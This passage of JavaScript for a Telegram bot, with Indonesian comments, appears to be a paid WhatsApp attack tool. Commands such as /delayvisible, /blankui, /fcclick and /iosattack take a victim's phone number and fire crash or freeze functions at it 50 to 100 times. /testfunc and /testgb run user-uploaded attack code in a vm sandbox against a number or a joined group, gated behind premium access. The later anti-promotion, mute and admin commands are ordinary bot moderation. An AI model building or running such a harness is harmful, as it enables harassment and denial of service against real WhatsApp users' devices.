        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
      },
    }
  );
});

bot.command("delayvisible", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown,  async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /delayvisible 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const sent = await ctx.sendPhoto("https://l.top4top.io/p_3803smv0s1.jpg", {
    caption: `
<blockquote>💤 MODE : DELAY VISIBLE

🤍 User   : ${username}
🎯 Target : ${q}
Type   : Status
🚀 Result : SUCCESS SEND</blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
      },
  });

  await (async () => {
    for (let i = 0; i < 50; i++) {
      await DelayFreezerByMia(sock, target);
      await sleep(1500);
    }
  })();

  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    sent.message_id,
    null,
    `
<blockquote>💤 MODE : DELAY VISIBLE

🤍 User   : ${username}
🎯 Target : ${q}
Type   : Status
🚀 Result : SUCCESS SEND</blockquote>
`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
      },
    }
  );
});

bot.command("blankui", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown,  async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /blankui 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const sent = await ctx.sendPhoto("https://l.top4top.io/p_3803smv0s1.jpg", {
    caption: `
<blockquote>💤 MODE : BLANK UI

🤍 User   : ${username}
🎯 Target : ${q}
Type   : Status
🚀 Result : SUCCESS SEND</blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
      },
  });

  await (async () => {
    for (let i = 0; i < 50; i++) {
      await BlankWithProto(sock, target);
      await sleep(1500);
    }
  })();

  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    sent.message_id,
    null,
    `
<blockquote>💤 MODE :  BLANK UI 

🤍 User   : ${username}
🎯 Target : ${q}
Type   : Status
🚀 Result : SUCCESS SEND</blockquote>
`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
      },
    }
  );
});

bot.command("boost", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown,  async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /boost 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const sent = await ctx.sendPhoto("https://l.top4top.io/p_3803smv0s1.jpg", {
    caption: `
<blockquote>💤 MODE : FC NO CLICK

🤍 User   : ${username}
🎯 Target : ${q}
Type   : Status
🚀 Result : SUCCESS SEND</blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
      },
  });

  await (async () => {
    for (let i = 0; i < 50; i++) {
      await X7Force(sock, target, false) 
      await sleep(1500);
    }
  })();

  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    sent.message_id,
    null,
    `
<blockquote>💤 MODE : FC NO CLICK

🤍 User   : ${username}
🎯 Target : ${q}
Type   : Status
🚀 Result : SUCCESS SEND</blockquote>
`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
      },
    }
  );
});

bot.command("fcclick", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown,  async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /uisystem 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const sent = await ctx.sendPhoto("https://l.top4top.io/p_3803smv0s1.jpg", {
    caption: `
<blockquote>💤 MODE : FC CLICK

🤍 User   : ${username}
🎯 Target : ${q}
Type   : Status
🚀 Result : SUCCESS SEND</blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
      },
  });

  await (async () => {
    for (let i = 0; i < 10; i++) {
      await X7Klik(sock, target);
      await fcbutton(sock, target);
      await sleep(1500);
    }
  })();

  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    sent.message_id,
    null,
    `
<blockquote>💤 MODE : FC CLICK

🤍 User   : ${username}
🎯 Target : ${q}
Type   : Status
🚀 Result : SUCCESS SEND</blockquote>
`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
      },
    }
  );
});

bot.command("iosattack", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown,  async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /iosattack 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const sent = await ctx.sendPhoto("https://l.top4top.io/p_3803smv0s1.jpg", {
    caption: `
<blockquote>💤 MODE : CRASH IOS

🤍 User   : ${username}
🎯 Target : ${q}
Type   : Status
🚀 Result : SUCCESS SEND</blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
      },
  });

  await (async () => {
    for (let i = 0; i < 100; i++) {
      await ioskres(sock, target);
      await sleep(1500);
    }
  })();

  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    sent.message_id,
    null,
    `
<blockquote>💤 MODE : CRASH IOS

🤍 User   : ${username}
🎯 Target : ${q}
Type   : Status
🚀 Result : SUCCESS SEND</blockquote>
`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
      },
    }
  );
});

const tesfunct = "https://l.top4top.io/p_3803smv0s1.jpg";
bot.command('testfunc', checkWhatsAppConnection, checkPremium, async (ctx) => {
  try {
    const chatId = ctx.chat.id;
    const senderId = ctx.from.id;
    const msg = ctx.message;
    const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    const args = ctx.message.text.split(" ");
    const targetNumber = args[1];
    const formattedNumber = targetNumber?.replace(/[^0-9]/g, "");
    const jid = `${formattedNumber}@s.whatsapp.net`;

    const replyId = msg.reply_to_message
      ? msg.reply_to_message.message_id
      : msg.message_id;

    if (args.length < 3)
      return ctx.reply(
        "🪧 ☇ Format: /testfunc 62xxx 10 (reply function/file)",
        { reply_to_message_id: replyId }
      );

    const q = args[1];

    const jumlah = Math.max(
      0,
      Math.min(parseInt(args[2]) || 1, 1000)
    );

    if (isNaN(jumlah) || jumlah <= 0)
      return ctx.reply(
        "❌ ☇ Jumlah harus angka",
        { reply_to_message_id: replyId }
      );

    const target =
      q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    let funcCode = "";

    if (msg.reply_to_message) {
      if (msg.reply_to_message.text) {
        funcCode = msg.reply_to_message.text;
      }
      else if (msg.reply_to_message.document) {

        const fileName =
          msg.reply_to_message.document.file_name || "";

        if (
          !fileName.endsWith(".js") &&
          !fileName.endsWith(".txt")
        ) {
          return ctx.reply(
            "❌ ☇ File harus .js atau .txt",
            { reply_to_message_id: replyId }
          );
        }

        const fileId =
          msg.reply_to_message.document.file_id;

        const fileUrl =
          await ctx.telegram.getFileLink(fileId);

        const response =
          await axios.get(fileUrl.href);

        funcCode = response.data;
      }
    }

    if (!funcCode)
      return ctx.reply(
        "❌ ☇ Reply function text atau file .js/.txt",
        { reply_to_message_id: replyId }
      );

    const processMsg = await ctx.replyWithPhoto(
      tesfunct,
      {
        caption: `<blockquote>💤 MODE : Test Function

🤍 User   : ${username}
🎯 Target : ${formattedNumber}
Type   : Status
🚀 Result : Proses</blockquote>`,
        parse_mode: "HTML",
        reply_to_message_id: replyId,
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "Check Target",
                url: `https://wa.me/${formattedNumber}`,
                style: "danger",
              },
            ],
          ],
        },
      }
    );

    const processMessageId =
      processMsg.message_id;

    const createSafeSock = (sock) => sock;

    const safeSock =
      createSafeSock(sock);

    const matchFunc = funcCode.match(
      /async function\s+([a-zA-Z0-9_]+)/
    );

    if (!matchFunc)
      return ctx.reply(
        "❌ ☇ Function tidak valid",
        { reply_to_message_id: replyId }
      );

    const funcName = matchFunc[1];

    const sandbox = {
      console,
      Buffer,
      sock: safeSock,
      target,
      sleep,
      generateWAMessageFromContent,
      generateForwardMessageContent,
      generateWAMessage,
      prepareWAMessageMedia,
      proto,
      jidDecode,
      areJidsSameUser,
    };

    const context =
      vm.createContext(sandbox);

    const wrapper = `
${funcCode}

${funcName}
`;

    const fn =
      vm.runInContext(wrapper, context);

    for (let i = 0; i < jumlah; i++) {

      try {

        const arity = fn.length;

        if (arity === 1) {

          await fn(target);

        } else if (arity === 2) {

          await fn(safeSock, target);

        } else {

          await fn(
            safeSock,
            target,
            true
          );

        }

      } catch (err) {

        console.error(err);

      }

      await sleep(200);

    }

    const finalText = `<blockquote>💤 MODE : Test Function

🤍 User   : ${username}
🎯 Target : ${formattedNumber}
Type   : Status
🚀 Result : SUCCESS SEND</blockquote>`;

    try {

      await ctx.telegram.editMessageCaption(
        chatId,
        processMessageId,
        undefined,
        finalText,
        {
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [
                {
                  text: "Check Target",
                  url: `https://wa.me/${formattedNumber}`,
                  style: "danger",
                },
              ],
            ],
          },
        }
      );

    } catch (e) {

      await ctx.replyWithPhoto(
        tesfunct,
        {
          caption: finalText,
          parse_mode: "HTML",
          reply_to_message_id: replyId,
          reply_markup: {
            inline_keyboard: [
              [
                {
                  text: "Check Target",
                  url: `https://wa.me/${formattedNumber}`,
                  style: "danger",
                },
              ],
            ],
          },
        }
      );

    }

  } catch (err) {

    console.error(err);

    ctx.reply(
      "FUNCTION LU EROR BANGKE",
      {
        reply_to_message_id: ctx.message.message_id,
      }
    );

  }
});

bot.command('testgb', checkWhatsAppConnection, checkPremium, async (ctx) => {
  try {
    const chatId = ctx.chat.id;
    const msg = ctx.message;
    const args = ctx.message.text.split(" ");
const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";

    const replyId = msg.reply_to_message
      ? msg.reply_to_message.message_id
      : msg.message_id;

    if (args.length < 3)
      return ctx.reply(
        "🪧 ☇ Format: /testgb https://chat.whatsapp.com/xxx 10 (reply function/file)",
        { reply_to_message_id: replyId }
      );

    const groupLink = args[1].trim();
    const jumlah = Math.max(0, Math.min(parseInt(args[2]) || 1, 1000));

    if (isNaN(jumlah) || jumlah <= 0)
      return ctx.reply(
        "❌ ☇ Jumlah harus angka",
        { reply_to_message_id: replyId }
      );

    // Validasi link grup
    const inviteRegex = /chat\.whatsapp\.com\/([a-zA-Z0-9]{20,26})/;
    const match = groupLink.match(inviteRegex);
    if (!match)
      return ctx.reply(
        "❌ ☇ Link grup tidak valid",
        { reply_to_message_id: replyId }
      );
    const groupCode = match[1];

    // Ambil funcCode
    let funcCode = "";
    if (msg.reply_to_message) {
      if (msg.reply_to_message.text) {
        funcCode = msg.reply_to_message.text;
      } else if (msg.reply_to_message.document) {
        const fileName = msg.reply_to_message.document.file_name || "";
        if (!fileName.endsWith(".js") && !fileName.endsWith(".txt")) {
          return ctx.reply(
            "❌ ☇ File harus .js atau .txt",
            { reply_to_message_id: replyId }
          );
        }
        const fileId = msg.reply_to_message.document.file_id;
        const fileUrl = await ctx.telegram.getFileLink(fileId);
        const response = await axios.get(fileUrl.href);
        funcCode = response.data;
      }
    }

    if (!funcCode)
      return ctx.reply(
        "❌ ☇ Reply function text atau file .js/.txt",
        { reply_to_message_id: replyId }
      );

    const matchFunc = funcCode.match(/async function\s+([a-zA-Z0-9_]+)/);
    if (!matchFunc)
      return ctx.reply(
        "❌ ☇ Function tidak valid",
        { reply_to_message_id: replyId }
      );

    const funcName = matchFunc[1];

    const processMsg = await ctx.replyWithPhoto(tesfunct, {
      caption: `<blockquote>💤 MODE : Test Function

🤍 User   : ${username}
🎯 Target : ${groupLink}
Type   : Status
🚀 Result : Joining Group</blockquote>`,
      parse_mode: "HTML",
      reply_to_message_id: replyId,
      reply_markup: {
        inline_keyboard: [[{ text: "Check Group", url: groupLink, style: "danger" }]],
      },
    });

    const processMessageId = processMsg.message_id;
    const safeSock = sock;

    // Join grup
    let targetJid;
    try {
      const groupData = await sock.groupGetInviteInfo(groupCode);
      targetJid = groupData.id;
      await sock.groupAcceptInvite(groupCode);
      await sleep(2500);
      console.log(`[SUCCESS] Berhasil Join: ${targetJid}`);
    } catch (e) {
      if (e.message.includes("409")) {
        // Sudah di dalam grup, lanjut
        console.log("[INFO] Bot sudah ada di dalam grup.");
        // Ambil JID dari invite info kalau belum dapat
        if (!targetJid) {
          try {
            const groupData = await sock.groupGetInviteInfo(groupCode);
            targetJid = groupData.id;
          } catch (_) {}
        }
      } else {
        try {
          await ctx.telegram.editMessageCaption(
            chatId, processMessageId, undefined,
            `❌ ☇ Gagal join grup: ${e.message}`,
            { parse_mode: "HTML", reply_markup: { inline_keyboard: [] } }
          );
        } catch (_) {}
        return;
      }
    }

    // Update status ke processing
    try {
      await ctx.telegram.editMessageCaption(
        chatId, processMessageId, undefined,
        `<blockquote>💤 MODE : Test Function

🤍 User   : ${username}
🎯 Target : ${groupLink}
Type   : Status
🚀 Result : Proses</blockquote>`,
        {
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [[{ text: "Check Group", url: groupLink, style: "danger", style: "danger" }]],
          },
        }
      );
    } catch (_) {}

    // Setup sandbox & VM
    const sandbox = {
      console,
      Buffer,
      sock: safeSock,
      target: targetJid,
      sleep,
      generateWAMessageFromContent,
      generateForwardMessageContent,
      generateWAMessage,
      prepareWAMessageMedia,
      proto,
      jidDecode,
      areJidsSameUser,
      String,
      Array,
      Object,
      JSON,
      Math,
      parseInt,
      parseFloat,
      isNaN,
    };

    const context = vm.createContext(sandbox);
    const wrapper = `${funcCode}\n${funcName}`;
    const fn = vm.runInContext(wrapper, context);

    // Loop eksekusi
    for (let i = 0; i < jumlah; i++) {
      try {
        const arity = fn.length;
        if (arity === 1) {
          await fn(targetJid);
        } else if (arity === 2) {
          await fn(safeSock, targetJid);
        } else {
          await fn(safeSock, targetJid, true);
        }
        console.log(`[SUCCESS] Bug ke-${i + 1} terkirim.`);
      } catch (err) {
        console.error(`[ERROR] Bug ke-${i + 1} gagal: ${err.message}`);
      }
      await sleep(2000);
    }

    const finalText = `<blockquote>💤 MODE : Test Function

🤍 User   : ${username}
🎯 Target : ${groupLink}
Type   : Status
🚀 Result : SUCCESS SEND</blockquote>`;

    try {
      await ctx.telegram.editMessageCaption(
        chatId, processMessageId, undefined,
        finalText,
        {
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [[{ text: "Check Group", url: groupLink, style: "danger" }]],
          },
        }
      );
    } catch (e) {
      await ctx.replyWithPhoto(tesfunct, {
        caption: finalText,
        parse_mode: "HTML",
        reply_to_message_id: replyId,
        reply_markup: {
          inline_keyboard: [[{ text: "Check Group", url: groupLink, style: "danger" }]],
        },
      });
    }

  } catch (err) {
    console.error(err);
    ctx.reply("FUNCTION LU EROR BANGKE", {
      reply_to_message_id: ctx.message.message_id,
    });
  }
});

////=========ANTI PROMOSI + AUTO MUTE========\\\\

const promoKeywords = [
  'join', 'gabung', 'promo', 'diskon', 'gratis', 'free',
  'klik', 'click', 'http://', 'https://', 't.me/', 'wa.me/',
  'bit.ly', 'linktr', 'invite', 'daftar', 'register', 'sell',
  'fs', 'forsell', 'apk bug', 'apk', 'minat', 'contact',
  'jual', 'beli', 'order', 'harga', 'murah', 'terjangkau',
  'channel', 'group', 'grup', 'bot baru', 'cek bio',
];

const PROMO_MUTE_DURATION_MS = 5 * 60 * 1000;

// Map userId → timestamp mute berakhir
const mutedPromo = new Map();

// Map groupId (string) → boolean
// true  = anti-promo AKTIF di group tersebut
// false = anti-promo MATI di group tersebut
// Jika groupId tidak ada di map → default MATI (harus dinyalakan manual)
const antiPromoGroups = new Map();

// ── Helper ──────────────────────────────────────────────────
function isPromoMessage(text) {
  if (!text) return false;
  const lower = text.toLowerCase();
  return promoKeywords.some(k => lower.includes(k));
}

async function isGroupAdmin(ctx, userId) {
  try {
    const member = await ctx.telegram.getChatMember(ctx.chat.id, userId);
    return ['administrator', 'creator'].includes(member.status);
  } catch {
    return false;
  }
}

// ── Command: /antipromo on|off|status  (Owner & admin group) ─
bot.command('antipromo', async (ctx) => {
  // Hanya berlaku di group
  if (ctx.chat?.type === 'private') {
    return ctx.reply('⚠️ Command ini hanya bisa digunakan di dalam group.');
  }

  const userId = ctx.from.id.toString();
  const groupId = ctx.chat.id.toString();

  // Hanya owner atau admin group yang boleh
  const isOwner = userId === OWNER_ID.toString();
  const isAdmin = await isGroupAdmin(ctx, ctx.from.id);
  if (!isOwner && !isAdmin) {
    return ctx.reply('⛔ Hanya owner atau admin group yang bisa menggunakan command ini.');
  }

  const arg = (ctx.message.text.split(' ')[1] || '').toLowerCase();
  const groupTitle = ctx.chat.title || groupId;

  if (arg === 'on') {
    antiPromoGroups.set(groupId, true);
    return ctx.reply(
      `✅ *Anti-Promo* telah *diaktifkan* di group ini!\n` +
      `🏠 Group: *${groupTitle}*\n\n` +
      `Setiap pesan promosi akan dihapus & pengirim di-mute 5 menit.`,
      { parse_mode: 'Markdown' }
    );
  } else if (arg === 'off') {
    antiPromoGroups.set(groupId, false);
    return ctx.reply(
      `🔕 *Anti-Promo* telah *dinonaktifkan* di group ini!\n` +
      `🏠 Group: *${groupTitle}*`,
      { parse_mode: 'Markdown' }
    );
  } else {
    // Tampilkan status
    const isActive = antiPromoGroups.get(groupId) === true;
    const status = isActive ? '🟢 *ON*' : '🔴 *OFF*';
    return ctx.reply(
      `ℹ️ Status Anti-Promo di *${groupTitle}*: ${status}\n\n` +
      `Gunakan:\n` +
      `• \`/antipromo on\` — aktifkan di group ini\n` +
      `• \`/antipromo off\` — nonaktifkan di group ini`,
      { parse_mode: 'Markdown' }
    );
  }
});

// ── Middleware: Anti promosi per group ──────────────────────
bot.use(async (ctx, next) => {
  if (!ctx.message?.text) return next();
  if (ctx.chat?.type === 'private') return next();

  const groupId = ctx.chat.id.toString();

  // Cek apakah anti-promo aktif di group ini
  // Default: MATI → harus dinyalakan manual per group
  if (antiPromoGroups.get(groupId) !== true) return next();

  const userId = ctx.from.id.toString();

  // Owner & admin group bebas
  if (userId === OWNER_ID.toString()) return next();
  const isAdmin = await isGroupAdmin(ctx, ctx.from.id);
  if (isAdmin) return next();

  const text = ctx.message.text;
  if (!isPromoMessage(text)) return next();

  const username = ctx.from.username ? `@${ctx.from.username}` : `#${userId}`;
  const fullName = `${ctx.from.first_name || ''}${ctx.from.last_name ? ' ' + ctx.from.last_name : ''}`.trim();
  const muteStart = new Date();
  const muteEnd = new Date(Date.now() + PROMO_MUTE_DURATION_MS);

  mutedPromo.set(userId, muteEnd.getTime());

  // Hapus pesan promosi
  try {
    await ctx.deleteMessage();
  } catch (e) {
    console.error('Gagal hapus pesan:', e.message);
  }

  // Mute di group via Telegram API
  try {
    await ctx.telegram.restrictChatMember(ctx.chat.id, ctx.from.id, {
      permissions: {
        can_send_messages: false,
        can_send_media_messages: false,
        can_send_other_messages: false,
        can_add_web_page_previews: false,
      },
      until_date: Math.floor(muteEnd.getTime() / 1000),
    });
  } catch (e) {
    console.error('Gagal mute:', e.message);
  }

  const logMessage =
    `\`\`\`javascript\n` +
    `┏━━━〔 ✞ 𝐗𝐘𝐋𝐄𝐍𝐓 𝐄𝐌𝐏𝐈𝐑𝐄 ✞ 〕━━━┓\n` +
    `   >> ANTI PROMOSI — AUTO MUTE <<\n` +
    `┗━━━━━━━━━━━━━━━━━━━━━━━┛\n\n` +
    `╭───〔 𝐋𝐎𝐆 𝐈𝐍𝐅𝐎 〕───╮\n` +
    `│ ◈ USER    : ${username}\n` +
    `│ ◈ NAMA    : ${fullName}\n` +
    `│ ◈ USER ID : ${userId}\n` +
    `│ ◈ GROUP   : ${ctx.chat.title || '-'}\n` +
    `│ ◈ PESAN   : ${text.slice(0, 50)}...\n` +
    `│ ◈ MUTE    : 5 Menit\n` +
    `│ ◈ MULAI   : ${formatDateTime(muteStart)}\n` +
    `│ ◈ BEBAS   : ${formatDateTime(muteEnd)}\n` +
    `╰──────────────────────╯\n` +
    `\`\`\``;

  // Log ke OWNER
  try {
    await ctx.telegram.sendPhoto(OWNER_ID, 'https://d.top4top.io/p_3804rkv7i1.jpg', {
      caption: logMessage,
      parse_mode: 'Markdown'
    });
  } catch (e) {
    console.error('Gagal kirim log owner:', e.message);
  }

  // Log ke GROUP LOG
  try {
    await ctx.telegram.sendPhoto(LOG_GROUP_ID, 'https://d.top4top.io/p_3804rkv7i1.jpg', {
      caption: logMessage,
      parse_mode: 'Markdown'
    });
  } catch (e) {
    console.error('Gagal kirim log group:', e.message);
  }

  // Notif di group
  await ctx.replyWithPhoto('https://d.top4top.io/p_3804rkv7i1.jpg', {
    caption:
      `🚫 *${fullName}* terdeteksi mengirim *pesan promosi* dan telah di-mute!\n\n` +
      `⏰ *Mulai* : ${formatDateTime(muteStart)}\n` +
      `✅ *Bebas* : ${formatDateTime(muteEnd)}`,
    parse_mode: 'Markdown'
  });

  return;
});

bot.command('addpromo', async (ctx) => {
  if (ctx.from.id.toString() !== OWNER_ID) {
    return ctx.reply('❌ Hanya owner yang bisa menggunakan command ini!');
  }
  const args = ctx.message.text.split(' ').slice(1).join(' ').toLowerCase();
  if (!args) return ctx.reply('⚠️ Contoh: /addpromo kata_promo');
  if (promoKeywords.includes(args)) return ctx.reply('⚠️ Keyword sudah ada!');
  promoKeywords.push(args);
  await ctx.reply(`✅ Keyword *${args}* berhasil ditambahkan!`, { parse_mode: 'Markdown' });
});

bot.command('delpromo', async (ctx) => {
  if (ctx.from.id.toString() !== OWNER_ID) {
    return ctx.reply('❌ Hanya owner yang bisa menggunakan command ini!');
  }
  const args = ctx.message.text.split(' ').slice(1).join(' ').toLowerCase();
  if (!args) return ctx.reply('⚠️ Contoh: /delpromo kata_promo');
  const idx = promoKeywords.indexOf(args);
  if (idx === -1) return ctx.reply('⚠️ Keyword tidak ditemukan!');
  promoKeywords.splice(idx, 1);
  await ctx.reply(`✅ Keyword *${args}* berhasil dihapus!`, { parse_mode: 'Markdown' });
});

bot.command('listpromo', async (ctx) => {
  if (ctx.from.id.toString() !== OWNER_ID) {
    return ctx.reply('❌ Hanya owner yang bisa menggunakan command ini!');
  }
  const list = promoKeywords.map((k, i) => `${i + 1}. ${k}`).join('\n');
  await ctx.reply(`📋 *Daftar Keyword Promosi:*\n\n${list}`, { parse_mode: 'Markdown' });
});

bot.command('unmute', async (ctx) => {
  if (ctx.from.id.toString() !== OWNER_ID) {
    return ctx.reply('❌ Hanya owner yang bisa menggunakan command ini!');
  }
  const target = ctx.message.reply_to_message;
  if (!target) return ctx.reply('⚠️ Reply pesan user yang mau di-unmute!');

  try {
    await ctx.telegram.restrictChatMember(ctx.chat.id, target.from.id, {
      permissions: {
        can_send_messages: true,
        can_send_media_messages: true,
        can_send_other_messages: true,
        can_add_web_page_previews: true,
      },
    });
    mutedPromo.delete(target.from.id.toString());
    await ctx.reply(`✅ *${target.from.first_name}* berhasil di-unmute!`, { parse_mode: 'Markdown' });
  } catch (e) {
    await ctx.reply('❌ Gagal unmute: ' + e.message);
  }
});
///=== comand blockcmd ===\\\
// ===============================
// BLOCK CMD GROUP - TELEGRAF
// ===============================

bot.command("blockcmd", checkAdmin, async (ctx) => {
  try {
    if (ctx.chat.type === "private")
      return ctx.reply("❌ Command ini hanya untuk grup.");

    const args = ctx.message.text.split(" ").slice(1);

    if (!args[0])
      return ctx.reply("Example : /blockcmd /menu");

    const cmd = args[0].toLowerCase();

    const db = loadDB();
    const groupId = String(ctx.chat.id);

    if (!db.groupCmdBlock)
      db.groupCmdBlock = {};

    if (!db.groupCmdBlock[groupId])
      db.groupCmdBlock[groupId] = [];

    // sudah ada
    if (db.groupCmdBlock[groupId].includes(cmd)) {
      return ctx.reply("⚠️ Command sudah diblock.");
    }

    db.groupCmdBlock[groupId].push(cmd);

    saveDB(db);

    ctx.reply(`✅ Berhasil block command ${cmd}`);
  } catch (err) {
    console.log(err);
    ctx.reply("Terjadi error.");
  }
});


// ===============================
// UNBLOCK CMD GROUP
// ===============================

bot.command("unblockcmd", checkAdmin, async (ctx) => {
  try {
    if (ctx.chat.type === "private")
      return ctx.reply("❌ Command ini hanya untuk grup.");

    const args = ctx.message.text.split(" ").slice(1);

    if (!args[0])
      return ctx.reply("Example : /unblockcmd /menu");

    const cmd = args[0].toLowerCase();

    const db = loadDB();
    const groupId = String(ctx.chat.id);

    if (!db.groupCmdBlock?.[groupId]) {
      return ctx.reply("⚠️ Tidak ada command yang diblock.");
    }

    db.groupCmdBlock[groupId] =
      db.groupCmdBlock[groupId].filter(c => c !== cmd);

    saveDB(db);

    ctx.reply(`✅ Berhasil unblock command ${cmd}`);
  } catch (err) {
    console.log(err);
    ctx.reply("Terjadi error.");
  }
});

bot.command("listblockcmd", async (ctx) => {
  try {
    const db = loadDB();
    const chatId = String(ctx.chat.id);

    const blocked =
      db.groupCmdBlock?.[chatId] || [];

    if (blocked.length < 1) {
      return ctx.reply(
        "❌ Tidak ada command yang diblock."
      );
    }

    let teks = `📌 LIST BLOCK COMMAND\n\n`;

    blocked.forEach((cmd, i) => {
      teks += `${i + 1}. ${cmd}\n`;
    });

    ctx.reply(teks);

  } catch (err) {
    console.log(err);
    ctx.reply("Terjadi error.");
  }
});
// Perintah untuk menambahkan pengguna premium (hanya owner)
bot.command("addadmin", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply(
      "❌ Format Salah!. Example: /addadmin 12345678"
    );
  }

  const userId = args[1];

  if (adminUsers.includes(userId)) {
    return ctx.reply(`✅ Pengguna ${userId} sudah memiliki status admin.`);
  }

  adminUsers.push(userId);
  saveJSON(adminFile, adminUsers);

  return ctx.reply(`✅ Pengguna ${userId} sekarang memiliki akses admin!`);
});
bot.command("addprem", checkOwner, checkAdmin, (ctx) => {
  const args = ctx.message.text.trim().split(" "); 

  if (args.length < 2) {
    return ctx.reply("❌ Format Salah!. Example : /addprem 12345678");
  }

  const userId = args[1].toString();

  if (premiumUsers.includes(userId)) {
    return ctx.reply(`✅ Pengguna ${userId} sudah memiliki akses premium.`);
  }

  premiumUsers.push(userId);
  saveJSON(premiumFile, premiumUsers);

  return ctx.reply(`✅ Pengguna ${userId} sekarang adalah premium.`);
});
///=== comand del admin ===\\\
bot.command("deladmin", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply(
      "❌ Format Salah!. Example : /deladmin 12345678"
    );
  }

  const userId = args[1];

  if (!adminUsers.includes(userId)) {
    return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar Admin.`);
  }

  adminUsers = adminUsers.filter((id) => id !== userId);
  saveJSON(adminFile, adminUsers);

  return ctx.reply(`🚫 Pengguna ${userId} telah dihapus dari daftar Admin.`);
});
bot.command("delprem", checkOwner, checkAdmin, (ctx) => {
  const args = ctx.message.text.trim().split(" ");

  if (args.length < 2) {
    return ctx.reply(
      "❌ Format Salah!. Example : /delprem 12345678"
    );
  }

  const userId = args[1].toString();

  if (!premiumUsers.includes(userId)) {
    return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar premium.`);
  }

  premiumUsers = premiumUsers.filter((id) => id !== userId);
  saveJSON(premiumFile, premiumUsers);

  return ctx.reply(`🚫 Pengguna ${userId} telah dihapus dari akses premium.`);
});


////=========PREMIUM GROUP========\\\\

const premiumGroupFile = './premiumGroups.json';
